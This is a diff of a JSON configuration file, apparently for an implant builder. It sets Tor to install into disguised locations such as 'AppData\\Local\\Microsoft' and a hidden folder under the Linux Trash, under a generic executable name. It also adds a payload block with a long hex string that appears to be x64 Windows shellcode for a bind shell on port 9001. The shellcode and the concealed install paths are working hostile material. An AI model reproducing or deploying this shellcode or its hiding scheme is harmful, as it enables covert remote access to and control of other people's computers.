@@ -1,13 +1,22 @@
 {
-    "tor_urls": {
-        "windows": "https://dist.torproject.org/torbrowser/11.0/tor-win32-0.4.6.8.zip",
-        "linux": "file://tor-linux/"
+    "name": "host of testing organization",
+    "hosts_file": "../hosts.json",
+    "tor": {
+        "build_for_windows": true,
+        "download_url": {
+            "windows": "https://dist.torproject.org/torbrowser/11.0/tor-win32-0.4.6.8.zip",
+            "linux": "file://tor-linux/"
+        },
+        "destination_dir": {
+            "windows": "AppData\\Local\\Microsoft",
+            "linux": ".local/share/Trash/.repo"
+        },
+        "rc_file": "torrc",
+        "executable": "MyApp",
     },
-    "tor_dirs": {
-        "windows": "AppData\\Local\\Microsoft",
-        "linux": ".local/share/Trash/.repo"
-    },
-    "torrc": "torrc",
-    "name": "MyApp",
-    "shellcode": ""
+    "payload": {
+        "enabled": false,
+        "hex": "fc4881e4f0ffffffe8cc00000041514150524831d265488b52605156488b5218488b5220480fb74a4a488b72504d31c94831c0ac3c617c022c2041c1c90d4101c1e2ed524151488b52208b423c4801d0668178180b020f85720000008b80880000004885c074674801d08b4818448b40204901d050e35648ffc9418b34884801d64d31c94831c041c1c90dac4101c138e075f14c034c24084539d175d858448b40244901d066418b0c48448b401c4901d0418b04884801d0415841585e595a41584159415a4883ec204152ffe05841595a488b12e94bffffff5d49be7773325f3332000041564989e64881eca00100004989e54831c0505049c7c40200232941544989e44c89f141ba4c772607ffd54c89ea68010100005941ba29806b00ffd56a025950504d31c94d31c048ffc04889c241baea0fdfe0ffd54889c76a1041584c89e24889f941bac2db3767ffd54831d24889f941bab7e938ffffd54d31c04831d24889f941ba74ec3be1ffd54889f94889c741ba756e4d61ffd54881c4b00200004883ec104889e24d31c96a0441584889f941ba02d9c85fffd54883c4205e89f66a404159680010000041584889f24831c941ba58a453e5ffd54889c34989c74d31c94989f04889da4889f941ba02d9c85fffd54801c34829c64885f675e141ffe7586a005949c7c2f0b5a256ffd5",
+        "bind_port": "9001"
+    }
 }
